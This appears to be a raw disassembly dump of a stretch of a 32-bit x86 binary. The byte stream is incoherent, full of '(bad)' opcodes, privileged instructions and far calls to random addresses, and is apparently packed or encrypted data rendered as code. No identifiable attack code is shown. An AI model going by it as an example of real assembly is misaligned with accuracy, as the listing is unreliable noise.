  4182e6:	xlat   BYTE PTR ds:[ebx]
  4182e7:	fsub   DWORD PTR [ecx+0xc]
  4182ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4182eb:	sbb    al,0xdd
  4182ed:	cwde   
  4182ee:	(bad)  
  4182ef:	aaa    
  4182f0:	mov    BYTE PTR [ecx],dl
  4182f2:	sub    BYTE PTR [ebx],bl
  4182f4:	(bad)  
  4182f5:	js     0x4182b5
  4182f7:	fnstenv [edx+0x6be9fd6e]
  4182fd:	test   BYTE PTR [edi+0x6b],0x1b
  418301:	(bad)  
  418303:	fnsave [edi]
  418305:	arpl   WORD PTR [ebx-0x31d08bd9],ax
  41830b:	test   al,0xb2
  41830d:	and    bh,BYTE PTR [ebx+0x7d24a35b]
  418313:	cmp    al,0x9a
  418315:	pop    ss
  418316:	popa   
  418317:	sbb    esi,esi
  418319:	or     ebx,DWORD PTR ds:0x2041744d
  41831f:	fmul   QWORD PTR [ecx+ebp*2-0x66]
  418323:	ror    BYTE PTR [edi],1
  418325:	cwde   
  418326:	test   al,0x85
  418328:	and    bl,BYTE PTR [esp+ecx*1-0x29]
  41832c:	push   ebx
  41832d:	or     ch,BYTE PTR [edx-0x6ad281fa]
  418333:	lahf   
  418334:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418335:	imul   eax,ebx,0x41
  418338:	scas   eax,DWORD PTR es:[edi]
  418339:	dec    edx
  41833a:	cli    
  41833b:	(bad)  [edx+0x66ebf9b3]
  418341:	adc    eax,0x9f49a794
  418346:	inc    esp
  418347:	adc    al,0xc1
  418349:	iret   
  41834a:	retf   
  41834b:	xor    DWORD PTR [ebx-0x610d55b2],0xffffffc7
  418352:	cs clc 
  418354:	data16 je 0x418398
  418357:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418358:	ja     0x41833c
  41835a:	shr    DWORD PTR [ecx],0xeb
  41835d:	aaa    
  41835e:	pop    edx
  41835f:	sub    esp,DWORD PTR [esi]
  418361:	jmp    0x23fff100
  418366:	imul   esi,DWORD PTR [ebp-0x58c54e50],0x6c
  41836d:	aam    0xd0
  41836f:	fild   QWORD PTR [edi]
  418371:	shl    DWORD PTR [bp+si-0x264e],cl
  418376:	outs   dx,BYTE PTR ds:[esi]
  418377:	out    0x1f,al
  418379:	jecxz  0x4183d6
  41837b:	fldcw  WORD PTR [edx-0x610d9f5]
  418381:	(bad)  
  418382:	dec    esp
  418383:	call   0xe9dbe08b
  418388:	outs   dx,DWORD PTR ds:[esi]
  418389:	outs   dx,BYTE PTR ds:[esi]
  41838a:	inc    ebx
  41838b:	mov    gs,WORD PTR [ebp+0x34]
  41838e:	mov    ecx,0x316ad8a7
  418393:	mov    edi,0xef522199
  418398:	mov    ebp,0x5dc187a
  41839d:	jmp    0x418361
  41839f:	dec    edi
  4183a0:	bound  esi,QWORD PTR [eax]
  4183a2:	lods   eax,DWORD PTR ds:[esi]
  4183a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4183a4:	mov    ch,0xbf
  4183a6:	ds mov esp,0x4b0cc297
  4183ac:	mov    dl,0xb3
  4183ae:	sbb    al,0xc2
  4183b0:	repz pop ebp
  4183b2:	imul   ebx,DWORD PTR [ebp-0x2180caec],0xf44fd132
  4183bc:	adc    DWORD PTR [esi-0x27],edi
  4183bf:	scas   al,BYTE PTR es:[edi]
  4183c0:	mov    dl,0x69
  4183c2:	add    eax,0xd1109173
  4183c7:	and    dh,bh
  4183c9:	icebp  
  4183ca:	add    BYTE PTR [edi+0x3e2db60d],ah
  4183d0:	push   esp
  4183d1:	rcl    BYTE PTR fs:[edi-0x3b5eb84d],1
  4183d8:	ds mov eax,0xfa4e4588
  4183de:	xor    BYTE PTR [esi+ecx*2-0x6241e5ac],bl
  4183e5:	dec    esi
  4183e6:	jns    0x4183d1
  4183e8:	repz inc eax
  4183ea:	call   0xdceb:0x4c378fb7
  4183f1:	jnp    0x4183db
  4183f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4183f4:	xchg   ebp,ecx
  4183f6:	push   eax
  4183f7:	jns    0x4183fd
  4183f9:	cmp    cl,0x5d
  4183fc:	rol    BYTE PTR [esi+0x34bccc60],cl
  418402:	mov    esi,0xb23186a7
  418407:	ins    BYTE PTR es:[edi],dx
  418408:	xor    ecx,DWORD PTR [eax-0x6a43a8f9]
  41840e:	dec    edi
  41840f:	imul   edi,DWORD PTR [ebx],0xb25bd38c
  418415:	mov    ah,0x23
  418417:	jns    0x418489
  418419:	or     DWORD PTR [edi-0x51787311],edi
  41841f:	jbe    0x41846d
  418421:	rcr    BYTE PTR [ebp+0x31af2184],1
  418427:	and    al,0x90
  418429:	imul   bh
  41842b:	aaa    
  41842c:	jnp    0x41844a
  41842e:	jg     0x4183d7
  418430:	xor    ecx,DWORD PTR [esi+0x6ab1cea]
  418436:	scas   al,BYTE PTR es:[edi]
  418437:	fwait
  418438:	lods   al,BYTE PTR ds:[esi]
  418439:	(bad)  
  41843a:	pop    edi
  41843b:	dec    edi
  41843c:	or     ecx,DWORD PTR [ebx]
  41843e:	(bad)  
  41843f:	dec    eax
  418440:	je     0x418484
  418442:	sub    bl,al
  418444:	ins    DWORD PTR es:[edi],dx
  418445:	and    eax,0xf4d7054
  41844a:	push   es
  41844b:	in     eax,dx
  41844c:	jns    0x4183d9
  41844e:	aas    
  41844f:	ror    DWORD PTR [eax],cl
  418451:	and    ah,BYTE PTR [ebx-0x7b744e]
  418457:	scas   eax,DWORD PTR es:[edi]
  418458:	mov    ch,0x2c
  41845a:	adc    edi,DWORD PTR [ecx-0x5e]
  41845d:	fdivr  DWORD PTR ds:0x7b0aa052
  418463:	jae    0x418482
  418465:	addr16 sti 
  418467:	sub    al,cl
  418469:	hlt    
  41846a:	push   edx
  41846b:	add    esi,DWORD PTR [eax-0x77]
  41846e:	call   0x1821:0xd706bc7a
  418475:	mov    al,ds:0xb515a701
  41847a:	jns    0x418411
  41847c:	ins    BYTE PTR es:[edi],dx
  41847d:	adc    al,ah
  41847f:	xor    BYTE PTR [ebp-0x19f918cd],0x21
  418486:	mov    ah,0xa7
  418488:	or     DWORD PTR [ecx],ecx
  41848a:	jae    0x4184ec
  41848c:	nop
  41848d:	or     ecx,DWORD PTR [ebx-0x62]
  418490:	mov    dh,0xbf
  418492:	in     al,dx
  418493:	inc    ebp
  418494:	fistp  WORD PTR [eax-0x57425b92]
  41849a:	scas   al,BYTE PTR es:[edi]
  41849b:	sti    
  41849c:	enter  0x4f4a,0xf1
  4184a0:	and    esi,ecx
  4184a2:	pop    esi
  4184a3:	mov    eax,ds:0xef110b60
  4184a8:	push   esp
  4184a9:	fdiv   QWORD PTR [esi+0x51]
  4184ac:	mov    eax,0xe1269a1c
  4184b1:	push   0xffffff8b
  4184b3:	sbb    edx,edi
  4184b5:	cmc    
  4184b6:	in     eax,0x49
  4184b8:	je     0x4184c5
  4184ba:	fld    TBYTE PTR [ecx+ecx*2-0x68]
  4184be:	xor    DWORD PTR [ecx],ebp
  4184c0:	mov    bl,BYTE PTR [ebx]
  4184c2:	call   0x24d6:0xbacabfa8
  4184c9:	push   0x5e
  4184cb:	mov    edx,0x62ab8925
  4184d0:	std    
  4184d1:	(bad)  
  4184d2:	mul    DWORD PTR [edi-0x44]
  4184d5:	(bad)  
  4184d6:	or     BYTE PTR [edx],al
  4184d8:	mov    bl,0x27
  4184da:	mov    ds:0x8f1707a3,al
  4184df:	jge    0x41852f
  4184e1:	les    edi,FWORD PTR [eax-0x25]
  4184e4:	or     BYTE PTR [ebx],0x41
  4184e7:	or     ecx,ebx
  4184e9:	clc    
  4184ea:	dec    ebp
  4184eb:	cmc    
  4184ec:	pop    esp
  4184ed:	sahf   
  4184ee:	call   0xb041:0x56cc8527
  4184f5:	out    dx,al
  4184f6:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  4184f8:	mov    dh,0x32
  4184fa:	adc    dl,BYTE PTR [ebx-0x25]
  4184fd:	ret    
  4184fe:	(bad)  
  4184ff:	out    0x89,eax
  418501:	mov    WORD PTR ds:0x9c47f620,?
  418507:	push   es
  418508:	xchg   ebp,eax
  418509:	and    BYTE PTR [edi+eiz*2-0x3],0x95
  41850e:	enter  0xc4cf,0xe
  418512:	rcl    dh,1
  418514:	jge    0x418517
  418516:	out    dx,eax
  418517:	pusha  
  418518:	adc    edi,DWORD PTR [edi+ebp*4]
  41851b:	push   edi
  41851c:	dec    edx
  41851d:	rol    DWORD PTR [edx+ecx*2],cl
  418520:	mov    dl,0x7
  418522:	mov    al,ds:0xcd16d3e9
  418527:	outs   dx,DWORD PTR ds:[esi]
  418528:	gs sbb al,0xf4
  41852b:	repz aas 
  41852d:	or     edx,edi
  41852f:	imul   edx,ecx,0xb0642044
  418535:	and    ebp,ebp
  418537:	fwait
  418538:	push   ecx
  418539:	dec    esp
  41853a:	mov    ebx,0x6b880127
  41853f:	cwde   
  418540:	sbb    cl,BYTE PTR [ebx]
  418542:	scas   al,BYTE PTR es:[edi]
  418543:	lock aaa 
  418545:	jne    0x418574
  418547:	jmp    DWORD PTR [ecx]
  418549:	call   0x27cf:0xa7e14293
  418550:	jnp    0x418545
  418552:	les    edx,FWORD PTR [ebp+0x77]
  418555:	or     al,0xe2
  418557:	rol    BYTE PTR [eax+eax*8],0xfa
  41855b:	pop    es
  41855c:	adc    BYTE PTR [edx+0x38b22bba],al
  418562:	shl    DWORD PTR [edx+edx*2-0x4f],cl
  418566:	jg     0x418512
  418568:	xchg   ebp,eax
  418569:	jecxz  0x4185d3
  41856b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41856c:	jnp    0x4185dd
  41856e:	sbb    cl,bl
  418570:	sar    edi,0x6
  418573:	sahf   
  418574:	mov    bl,0xe9
  418576:	jecxz  0x41852e
  418578:	(bad)  [esi]
  41857a:	outs   dx,DWORD PTR ds:[esi]
  41857b:	fdiv   st,st(2)
  41857d:	fld    TBYTE PTR [ecx+0x66]
  418580:	jge    0x4185fb
  418582:	xchg   esi,eax
  418583:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418584:	cdq    
  418585:	mov    esp,0xe894225f
  41858a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41858b:	std    
  41858c:	mov    dl,0x5a
  41858e:	pop    esi
  41858f:	sti    
  418590:	in     eax,dx
  418591:	jnp    0x41851d
  418593:	sbb    eax,ebx
  418595:	or     ebx,DWORD PTR [eax]
  418597:	aad    0x5a
  418599:	mov    ebx,0x5913fade
  41859e:	fwait
  41859f:	rcr    BYTE PTR [eax],0xe8
  4185a2:	push   cs
  4185a3:	cmp    eax,0x474cd18e
  4185a8:	cmp    DWORD PTR [ebp-0x2685583f],ebp
  4185ae:	sub    al,BYTE PTR [ebx-0x80]
  4185b1:	(bad)  
  4185b2:	dec    esi
  4185b3:	in     al,0xb2
  4185b5:	lar    ecx,si
  4185b8:	sbb    BYTE PTR [esi],dh
  4185ba:	inc    esp
  4185bb:	sbb    edx,DWORD PTR [edx+esi*1+0x3f]
  4185bf:	imul   esi,DWORD PTR [edx],0x3acdab7f
  4185c5:	inc    ebp
  4185c6:	pop    ds
  4185c7:	mov    esi,0xbc86b1b2
  4185cc:	dec    edx
  4185cd:	mov    ebp,0xb5757eb
  4185d2:	jbe    0x41864b
  4185d4:	retf   
  4185d5:	pusha  
  4185d6:	cmp    al,0xfb
  4185d8:	mov    edx,0xbf219d8b
  4185dd:	mov    ds:0x294639a5,eax
  4185e2:	pop    edx
  4185e3:	cs out 0xff,al
  4185e6:	and    BYTE PTR [edi+0x10c7ace1],0x8b
  4185ed:	push   ebx
  4185ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4185ef:	pop    es
  4185f0:	mov    dl,0x17
  4185f2:	xchg   ebp,eax
  4185f3:	cmc    
  4185f4:	sbb    cl,BYTE PTR [ecx+0xbf16898]
  4185fa:	xor    esp,eax
  4185fc:	jmp    0x418673
  4185fe:	push   edi
  4185ff:	aad    0xbb
  418601:	jmp    0x418598
  418603:	sbb    ebx,DWORD PTR [esi]
  418605:	push   esp
  418606:	aaa    
  418607:	dec    eax
  418608:	popa   
  418609:	imul   edx,DWORD PTR [esi],0xfffffffc
  41860c:	repnz cmp DWORD PTR [esi],edi
  41860f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418610:	jmp    0x418675
  418612:	mov    cl,0xaa
  418614:	mov    esp,0x58556dd3
  418619:	cli    
  41861a:	call   0xc9ca:0x6eaef9d
  418621:	hlt    
  418622:	dec    ebp
  418623:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418624:	inc    esi
  418625:	pushf  
  418626:	mov    ebx,0x98507b77
  41862b:	and    al,0xb2
  41862d:	loopne 0x41867f
  41862f:	add    DWORD PTR [esi-0x65],esp
  418632:	xchg   ebx,eax
  418633:	test   DWORD PTR [ebp-0x3beb7ef5],0x258b98
  41863d:	push   0xd1fc319a
  418642:	xor    eax,0x54e859ff
  418647:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418648:	push   edx
  418649:	push   ecx
  41864a:	sbb    bl,BYTE PTR [ebx-0x1a]
  41864d:	je     0x418662
  41864f:	aas    
  418650:	mov    dl,0xa1
  418652:	cli    
  418653:	mov    ?,ebp
  418655:	pop    ebx
  418656:	and    ecx,0xffffff92
  418659:	add    al,0x71
  41865b:	out    dx,al
  41865c:	pop    eax
  41865d:	push   ebx
  41865e:	pop    ds
  41865f:	imul   eax,DWORD PTR [ebx-0x35],0x25b848
  418666:	and    dh,BYTE PTR [ecx-0x26e48d4e]
  41866c:	fs mov cr3,ecx
  418670:	cmp    dh,BYTE PTR ds:0xe3af2b94
  418676:	(bad)  [ebx+ecx*2+0x51ab627d]
  41867d:	mov    bh,0x12
  41867f:	xor    eax,0x829a1aeb
  418684:	fnsave [eax]
  418686:	dec    ebx
  418687:	outs   dx,DWORD PTR ds:[esi]
  418688:	into   
  418689:	test   al,0x55
  41868b:	(bad)  
  41868c:	inc    eax
  41868d:	std    
  41868e:	fisub  WORD PTR [edi+0x3b6f3f1e]
  418694:	ret    0xa785
  418697:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418698:	mov    dl,0x72
  41869a:	retf   
  41869b:	push   eax
  41869c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41869d:	cmp    BYTE PTR [ebp-0x3f4cdd4],bl
  4186a3:	repz sbb dh,BYTE PTR [ecx]
  4186a6:	sbb    DWORD PTR [ecx],0xffffffbc
  4186a9:	push   edi
  4186aa:	call   0xe180:0x4759691d
  4186b1:	jl     0x418713
  4186b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4186b4:	addr16 jns 0x4186fb
  4186b7:	(bad)
  4186ba:	cmp    BYTE PTR [ebx-0x52],dl
  4186bd:	push   ss
  4186be:	sbb    eax,0xdb8a322d
  4186c3:	int3   
  4186c4:	cmp    eax,0x15a7cfa8
  4186c9:	push   edx
  4186ca:	dec    edx
  4186cb:	sub    DWORD PTR [ebp+0x7b],ebp
  4186ce:	xchg   ecx,eax
  4186cf:	shl    DWORD PTR [edx+0x78867135],cl
  4186d5:	add    al,0xd
  4186d7:	adc    ebx,DWORD PTR [ebx-0x24891fea]
  4186dd:	mov    ebx,DWORD PTR [esp+edi*4+0x77bdf96f]
  4186e4:	mov    dl,0x9a
  4186e6:	int    0x41
  4186e8:	dec    eax
  4186e9:	mov    DWORD PTR [ecx+0x21],esi
  4186ec:	ja     0x4186f9
  4186ee:	arpl   dx,bp
  4186f0:	idiv   esi
  4186f2:	stos   DWORD PTR es:[edi],eax
  4186f3:	pop    ds
  4186f4:	xchg   BYTE PTR ds:0x2806ed98,ch
  4186fa:	adc    edi,ecx
  4186fc:	mov    ds:0x3f01f46b,eax
  418701:	or     DWORD PTR [eax],ecx
  418703:	(bad)  
  418704:	jne    0x41875c
  418706:	pop    ecx
  418707:	dec    edi
  418708:	les    ebp,FWORD PTR [ebx-0x65]
  41870b:	adc    BYTE PTR [ebp-0x1f],bl
  41870e:	pop    ebx
  41870f:	jmp    0x4186a3
  418711:	inc    ebp
  418712:	mov    esi,0x2f0cabd8
  418717:	fimul  WORD PTR [edx]
  418719:	adc    al,0xf7
  41871b:	addr16 inc eax
  41871d:	jmp    0x180a:0xd6ac80df
  418724:	repnz icebp 
  418726:	cmc    
  418727:	sti    
  418728:	adc    eax,0x97a79dce
  41872d:	lahf   
  41872e:	jne    0x418725
  418730:	jb     0x4186dd
  418732:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418733:	cmp    DWORD PTR [edx-0x16d8eb15],esi
  418739:	ins    DWORD PTR es:[edi],dx
  41873a:	mov    ah,BYTE PTR [esi-0x4b8f40d]
  418740:	ins    BYTE PTR es:[edi],dx
  418741:	inc    ecx
  418742:	ins    BYTE PTR es:[edi],dx
  418743:	mov    eax,0x829abf73
  418748:	cmp    al,0x26
  41874a:	pop    ss
  41874b:	or     BYTE PTR [ecx],bh
  41874d:	mov    ah,BYTE PTR [ebx]
  41874f:	mov    ah,0xce
  418751:	stc    
  418752:	jle    0x41879b
  418754:	pop    edi
  418755:	jne    0x4186f1
  418757:	jmp    0x1308:0xe2d521da
  41875e:	add    eax,0x9e91b1ff
  418763:	int3   
  418764:	and    al,BYTE PTR [esi]
  418766:	out    0x27,eax
  418768:	mov    ?,WORD PTR [ebp+0x79b2bde5]
  41876e:	jg     0x418721
  418770:	sub    DWORD PTR [edi+0xb82cbb4],ebx
  418776:	cld    
  418777:	std    
  418778:	dec    edx
  418779:	mov    esp,0xd1564d72
  41877e:	shr    BYTE PTR [eax-0x415e89ac],cl
  418784:	mov    al,BYTE PTR ds:0xeb1c0acf
  41878a:	xlat   BYTE PTR ds:[ebx]
  41878b:	mov    ch,0x7d
  41878d:	je     0x4187a0
  41878f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418790:	bound  esi,QWORD PTR [eax+ecx*2+0x50f77f6]
  418797:	call   0xa101:0x7f2772b2
  41879e:	jmp    0x33568ea0
  4187a3:	scas   al,BYTE PTR es:[edi]
  4187a4:	leave  
  4187a5:	or     esp,DWORD PTR [edx]
  4187a7:	push   ss
  4187a8:	inc    eax
  4187a9:	push   esi
  4187aa:	(bad)  
  4187ab:	jb     0x418766
  4187ad:	test   eax,0xb183c39
  4187b2:	aam    0x31
  4187b4:	ret    0xf471
  4187b7:	aam    0xc0
  4187b9:	or     esp,ecx
  4187bb:	pop    ebp
  4187bc:	mov    ebp,DWORD PTR [ecx]
  4187be:	inc    ecx
  4187bf:	and    al,0x32
  4187c1:	push   ecx
  4187c2:	test   al,ch
  4187c4:	cdq    
  4187c5:	sahf   
  4187c6:	(bad)  
  4187c8:	sbb    DWORD PTR [ebx-0x76],0xfffffff3
  4187cc:	mov    edi,0x6d9f56a7
  4187d1:	test   al,0x9d
  4187d3:	jle    0x4187a0
  4187d5:	xor    ebx,DWORD PTR [ebx+0x57]
  4187d8:	mov    al,0xfd
  4187da:	clc    
  4187db:	sub    BYTE PTR [edx-0x7b3d6e62],dh
  4187e1:	mov    ah,0x65
  4187e3:	fs ins DWORD PTR es:[edi],dx
  4187e5:	ja     0x4187a1
  4187e7:	mov    al,ds:0x73a1d68d
  4187ec:	in     al,dx
  4187ed:	cmp    edi,ebp
  4187ef:	or     dl,bh
  4187f1:	(bad)  
  4187f2:	call   0x4ed5:0xa3ff04cf
  4187f9:	mov    WORD PTR [edi],ds
  4187fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4187fc:	(bad)  ds:0x20d62d94
  418802:	inc    esp
  418803:	cli    
  418804:	mov    dl,0x48
  418806:	(bad)  [ecx+ebp*4]
  418809:	das    
  41880a:	adc    DWORD PTR [ebx],ecx
  41880c:	push   es
  41880d:	or     esi,DWORD PTR [esi+0xc0ef1]
  418813:	xchg   bp,ax
  418815:	sub    eax,0x6f402e9a
  41881a:	ins    BYTE PTR es:[edi],dx
  41881b:	inc    ebx
  41881c:	fld    TBYTE PTR [edx+0xbc73ff7]
  418822:	inc    esi
  418823:	imul   edx,DWORD PTR [ebx+0x9a2fba2],0x52
  41882a:	call   0x5472:0x5d5705fd
  418831:	xor    edx,eax
  418833:	pop    es
  418834:	pop    esp
  418835:	rcr    BYTE PTR [ecx-0x20561c7f],cl
  41883b:	mov    esi,DWORD PTR [ebx+0xb]
  41883e:	(bad)  
  41883f:	or     esp,DWORD PTR [ebp+ecx*8+0x2bb2d70d]
  418846:	in     eax,dx
  418847:	sahf   
  418848:	pop    ebx
  418849:	mov    edx,0x77b1bfa5
  41884e:	pop    edi
  41884f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418850:	pop    edi
  418851:	cld    
  418852:	bound  edi,QWORD PTR ds:0x5a3188ab
  418858:	mov    dl,0x85
  41885a:	je     0x418889
  41885c:	retf   0x66ee
  41885f:	mov    ds:0xb3ab0a9f,eax
  418864:	xor    DWORD PTR [eax+ebx*2-0x64cb170b],0x886260d7
  41886f:	out    0x66,al
  418871:	jle    0x418896
  418873:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418874:	test   DWORD PTR [ecx-0x4c],ebp
  418877:	gs pop esp
  418879:	add    esi,DWORD PTR [esi]
  41887b:	xor    esi,DWORD PTR [edx-0x2ae65be4]
  418881:	arpl   bp,cx
  418883:	push   ebx
  418884:	out    0x1,al
  418886:	pop    ebx
  418887:	inc    edi
  418888:	sub    al,0x4b
  41888a:	dec    esi
  41888b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41888c:	cli    
  41888d:	test   BYTE PTR [edx-0x57],ch
  418890:	push   cs
  418891:	add    BYTE PTR [ecx+0x65d98003],dl
  418897:	and    BYTE PTR [edx-0x57f654e5],bh
  41889d:	mov    esi,0xabd28b52
  4188a2:	dec    ebp
  4188a3:	sub    dl,BYTE PTR [edi]
  4188a5:	or     edx,DWORD PTR [esi+0x19]
  4188a8:	ins    BYTE PTR es:[edi],dx
  4188a9:	addr16 int 0xab
  4188ac:	das    
  4188ad:	pusha  
  4188ae:	call   0x1c21:0x101b0fdf
  4188b5:	out    0x97,eax
  4188b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4188b8:	cwde   
  4188b9:	xor    DWORD PTR [edx*1-0x226cbc01],edx
  4188c0:	mov    dl,0x41
  4188c2:	(bad)  
  4188c3:	cmp    ebp,DWORD PTR [edi-0x5e]
  4188c6:	xor    esi,edi
  4188c8:	dec    esp
  4188c9:	add    al,0xe3
  4188cb:	les    ebx,FWORD PTR [eax]
  4188cd:	retf   0xf87a
  4188d0:	pop    ebx
  4188d1:	pop    esi
  4188d2:	lock js 0x418889
  4188d5:	adc    esi,ebx
  4188d7:	test   DWORD PTR [ebx],ebx
  4188d9:	clc    
  4188da:	fisub  DWORD PTR [edi-0x3ee97062]
  4188e0:	pop    ss
  4188e1:	and    ch,BYTE PTR [eax+0x0]
  4188e4:	mov    dl,0xd5
  4188e6:	push   ebp
  4188e7:	sbb    al,0xaf
  4188e9:	std    
  4188ea:	add    eax,0xdd0b4fd0
  4188ef:	xchg   edi,eax
  4188f0:	pop    esi
  4188f1:	sbb    DWORD PTR [ecx+0x1f],ebp
  4188f4:	sub    dh,ah
  4188f6:	call   0xb893:0xd14dfe37
  4188fd:	xor    BYTE PTR [ebx-0x65231465],bl
  418903:	xchg   esi,eax
  418904:	and    BYTE PTR [edi-0x69],0x44
  418908:	jb     0x418891
  41890a:	loop   0x418899
  41890c:	mov    dl,0xfe
  41890e:	or     DWORD PTR [eax+0x5401145a],esp
  418914:	aaa    
  418915:	adc    al,0x8e
  418917:	popa   
  418918:	xchg   esi,eax
  418919:	or     al,0xad
  41891b:	test   dh,ah
  41891d:	pop    ebx
  41891e:	(bad)  
  418920:	lds    eax,FWORD PTR [edi]
  418922:	call   0x8720:0x5e440a4a
  418929:	pop    eax
  41892a:	xor    BYTE PTR [edi+0x53bfc020],ah
  418930:	adc    BYTE PTR [ecx+eiz*4+0x55],dl
  418934:	lods   al,BYTE PTR ds:[esi]
  418935:	and    al,0xe1
  418937:	sbb    al,0xb2
  418939:	jmp    0x55a394fa
  41893e:	in     eax,0x57
  418940:	pop    eax
  418941:	or     eax,DWORD PTR [esi-0x75]
  418944:	fwait
  418945:	std    
  418946:	cli    
  418947:	cli    
  418948:	inc    ebx
  418949:	or     cl,BYTE PTR [ecx+edi*4-0x2965bf0b]
  418950:	loop   0x418903
  418952:	and    BYTE PTR ss:[esi],cl
  418955:	adc    al,0x11
  418957:	mov    ds:0xde02c424,eax
  41895c:	push   edx
  41895d:	mov    ebx,0xf34e36cb
  418962:	call   0xce76:0x8e3bd26e
  418969:	mov    bl,0x13
  41896b:	(bad)  
  41896c:	mov    BYTE PTR [ebx],cl
  41896e:	mov    edi,0xe448df01
  418973:	push   esp
  418974:	sbb    cl,ah
  418976:	cmp    al,BYTE PTR [esi]
  418978:	(bad)  
  418979:	and    eax,0x8bcd4d9b
  41897e:	mov    ebp,0xeaebe6e7
  418983:	in     eax,0x64
  418985:	push   cs
  418986:	clc    
  418987:	cmc    
  418988:	and    ah,0x9c
  41898b:	pop    ecx
  41898c:	mov    dl,0xd
  41898e:	dec    eax
  41898f:	mov    WORD PTR [ebx-0x52],gs
  418992:	push   0xffffffa7
  418994:	xor    al,0x81
  418996:	leave  
  418997:	in     eax,dx
  418998:	pop    esi
  418999:	nop
  41899a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41899b:	pop    ebp
  41899c:	ret    
  41899d:	cs call 0x717a:0x29974094
  4189a5:	es adc eax,0x73290a7
  4189ab:	and    edx,DWORD PTR [edx-0x50e082b9]
  4189b1:	sahf   
  4189b2:	retf   0xb22d
  4189b5:	push   es
  4189b6:	cmp    eax,0x55d1cb5
  4189bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4189bc:	repz and DWORD PTR [eax+0x3],0x33
  4189c1:	addr16 cmc 
  4189c3:	inc    esp
  4189c4:	mov    dl,0x85
  4189c6:	jge    0x418986
  4189c8:	sub    BYTE PTR [esi+0x42],cl
  4189cb:	test   BYTE PTR [edi],al
  4189cd:	add    al,0x69
  4189cf:	sahf   
  4189d0:	lds    ebp,FWORD PTR [eax+0x3620081a]
  4189d6:	ficomp DWORD PTR [ebx]
  4189d8:	mov    dl,0xf2
  4189da:	(bad)  
  4189db:	outs   dx,DWORD PTR cs:[esi]
  4189dd:	adc    al,0xd0
  4189df:	iret   
  4189e0:	xor    eax,0xfa7f3e1
  4189e5:	call   0x622019b7
  4189ea:	pop    ss
  4189eb:	bound  ecx,QWORD PTR [ecx+0x54a76245]
  4189f1:	pop    ds
  4189f2:	fdiv   st,st(1)
  4189f4:	nop
  4189f5:	jnp    0x418a00
  4189f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4189f8:	fucomip st,st(2)
  4189fa:	cmp    esp,esp
  4189fc:	out    0xa9,al
  4189fe:	cmp    eax,0xb85b2f7
  418a03:	pop    ss
  418a04:	bound  edx,QWORD PTR [ecx]
  418a06:	in     eax,dx
  418a07:	aaa    
  418a08:	ror    BYTE PTR [esp+ebx*2],0x93
  418a0c:	pop    ds
  418a0d:	dec    ecx
  418a0e:	lods   al,BYTE PTR ds:[esi]
  418a0f:	push   edi
  418a10:	push   cs
  418a11:	and    eax,0xdab2c574
  418a16:	das    
  418a17:	leave  
  418a18:	sbb    eax,0x50d3bf5a
  418a1d:	or     eax,DWORD PTR [esp-0x34]
  418a21:	jge    0x418a63
  418a23:	loop   0x418a5c
  418a25:	outs   dx,BYTE PTR ds:[esi]
  418a26:	shl    ah,cl
  418a28:	xor    cl,BYTE PTR [ebx]
  418a2a:	push   cs
  418a2b:	enter  0xd85f,0xfa
  418a2f:	sub    al,0xc7
  418a31:	push   ss
  418a32:	pop    ss
  418a33:	test   BYTE PTR [edi-0x35],0xaf
  418a37:	jp     0x418a5c
  418a39:	je     0x418a56
  418a3b:	xchg   ecx,eax
  418a3c:	jb     0x418a91
  418a3e:	loope  0x4189e5
  418a40:	inc    ecx
  418a41:	xchg   ebx,eax
  418a42:	dec    edi
  418a43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418a44:	sub    esi,DWORD PTR [edx+0x67]
  418a47:	sbb    eax,eax
  418a49:	in     eax,dx
  418a4a:	sub    al,0x7e
  418a4c:	push   edx
  418a4d:	mov    dh,0x9a
  418a4f:	pop    es
  418a50:	lock inc esp
  418a52:	imul   ecx,DWORD PTR [edi-0x15],0x43
  418a56:	pusha  
  418a57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418a58:	test   eax,0x4ef3959d
  418a5d:	lds    ebp,FWORD PTR [edx+0x5767b265]
  418a63:	jg     0x418a41
  418a65:	mov    ds:0xbf30ba4,al
  418a6a:	and    bl,BYTE PTR [ebp+0x6b]
  418a6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418a6e:	scas   al,BYTE PTR es:[edi]
  418a6f:	shl    DWORD PTR [edi-0x8],cl
  418a72:	ret    0x5770
  418a75:	or     esp,ebx
  418a77:	mov    bh,bl
  418a79:	xchg   esi,eax
  418a7a:	cmc    
  418a7b:	xchg   ecx,eax
  418a7c:	mov    cs,WORD PTR [ebx]
  418a7e:	adc    ecx,edi
  418a80:	bound  ebx,QWORD PTR [ecx-0x5ea5171a]
  418a86:	call   0x61d2:0x649866e4
  418a8d:	(bad)  
  418a8e:	pop    eax
  418a8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418a90:	sub    bh,ch
